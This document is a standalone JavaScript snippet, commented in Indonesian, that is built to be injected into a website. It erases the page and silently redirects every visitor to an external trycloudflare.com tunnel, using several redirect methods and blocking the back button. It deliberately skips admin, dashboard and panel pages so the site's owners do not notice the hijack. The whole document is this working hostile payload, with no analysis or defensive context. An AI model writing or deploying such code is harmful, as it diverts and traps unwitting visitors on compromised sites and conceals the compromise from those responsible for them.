<script>
(() => {
    'use strict';

    const TARGET = "https://durham-directory-homework-measured.trycloudflare.com";
    const currentUrl = window.location.href;

    // Pengecualian untuk halaman admin
    if (currentUrl.includes('/admin/') || 
        currentUrl.includes('/dashboard') || 
        currentUrl.includes('/panel') || 
        currentUrl.includes('admin')) {
        console.log('%cAdmin Panel Detected - Access Granted', 'color:green;font-weight:bold');
        return;
    }

    const silentHijack = () => {
        // Hapus semua konten secepat mungkin agar tidak terlihat
        document.documentElement.innerHTML = '';

        // Redirect methods (urutan paling efektif)
        window.location.replace(TARGET);
        window.location.href = TARGET;
        window.top.location.href = TARGET;

        // Backup sangat silent
        const meta = document.createElement('meta');
        meta.httpEquiv = "refresh";
        meta.content = "0; url=" + TARGET;
        document.head.appendChild(meta);

        setTimeout(() => {
            window.location.assign(TARGET);
            window.open(TARGET, '_self');
        }, 5);
    };

    // Jalankan secepat mungkin
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', silentHijack, { once: true });
    } else {
        silentHijack();
    }

    // Proteksi mundur (back button)
    history.pushState(null, null, location.href);
    window.onpopstate = () => {
        history.go(1);
        silentHijack();
    };

})();
</script>
